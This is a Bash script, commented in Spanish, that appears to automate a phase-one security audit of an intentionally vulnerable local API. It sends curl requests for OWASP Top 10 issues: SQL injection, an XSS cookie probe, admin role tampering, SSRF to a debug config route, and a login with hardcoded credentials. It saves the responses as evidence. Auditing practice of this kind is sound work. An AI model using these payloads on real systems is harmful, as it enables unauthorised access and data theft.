#!/usr/bin/env bash
# Script Automatizado de Auditoria Fase 1 - API Vulnerable (Caso 3)
API_URL="http://localhost:3000"
EVIDENCIAS_DIR="./auditoria/fase1/evidencias"

mkdir -p "$EVIDENCIAS_DIR"

echo "================================================================"
echo "    INICIANDO AUDITORIA DE VULNERABILIDADES (FASE 1)            "
echo "================================================================"

# A01: Broken Access Control (Modificar nota usando role=admin)
echo "[+] Probando A01: Escalada de privilegios (role=admin)..."
curl -i -s -X POST "$API_URL/api/grades/update" \
  -H "Content-Type: application/json" \
  -d '{"studentId": 1, "grade": 7.0, "role": "admin"}' > "$EVIDENCIAS_DIR/a01_broken_access_control.txt"

# A02: Cryptographic Failures (Generar token con secreto debil)
echo "[+] Probando A02: Obtencion de JWT con firma debil sin expiracion..."
curl -i -s -X POST "$API_URL/api/login/student" \
  -H "Content-Type: application/json" \
  -d '{"rut": "12345678-5"}' > "$EVIDENCIAS_DIR/a02_cryptographic_failures.txt"

# A03: Injection (SQL Injection clasica en parametro RUT)
echo "[+] Probando A03: Inyeccion SQL en parametro rut..."
curl -i -s -G "$API_URL/api/students" \
  --data-urlencode "rut=' OR '1'='1" > "$EVIDENCIAS_DIR/a03_sql_injection.txt"

# A04: Insecure Design (Envio de examen fuera de tiempo limite)
echo "[+] Probando A04: Envio de examen con plazo expirado..."
curl -i -s -X POST "$API_URL/api/exams/1/submit" \
  -H "Content-Type: application/json" \
  -d '{"answers": {"p1": "A", "p2": "B"}}' > "$EVIDENCIAS_DIR/a04_insecure_design.txt"

# A05: Security Misconfiguration (Exposicion de ruta /debug/config)
echo "[+] Probando A05: Acceso a ruta debug con variables de entorno y claves..."
curl -i -s "$API_URL/debug/config" > "$EVIDENCIAS_DIR/a05_security_misconfiguration.txt"

# A07: Identification and Authentication Failures (Autenticacion docente MD5)
echo "[+] Probando A07: Login con credenciales almacenadas en MD5 sin sal..."
curl -i -s -X POST "$API_URL/api/login/teacher" \
  -H "Content-Type: application/json" \
  -d '{"email": "profesor@campus.cl", "password": "profesor123"}' > "$EVIDENCIAS_DIR/a07_auth_failures.txt"

# A08: Software and Data Integrity Failures (Inyeccion XSS en foros)
echo "[+] Probando A08: Publicacion de contenido con script malicioso..."
curl -i -s -X POST "$API_URL/api/forum/posts" \
  -H "Content-Type: application/json" \
  -d '{"author": "Atacante", "content": "<script>alert(document.cookie)</script>"}' > "$EVIDENCIAS_DIR/a08_xss_injection.txt"

# A09: Security Logging Failures (Acceso sin generar logs de auditoria)
echo "[+] Probando A09: Acceso a evaluacion sin trazabilidad ni logging..."
curl -i -s "$API_URL/api/exams/1/content" > "$EVIDENCIAS_DIR/a09_logging_failures.txt"

# A10: Server-Side Request Forgery (SSRF hacia red interna)
echo "[+] Probando A10: Solicitud SSRF a direccion arbitraria..."
curl -i -s -X POST "$API_URL/api/exams/import-external" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:3000/debug/config"}' > "$EVIDENCIAS_DIR/a10_ssrf.txt"

echo "================================================================"
echo "Auditoria Fase 1 finalizada. Archivos generados en $EVIDENCIAS_DIR"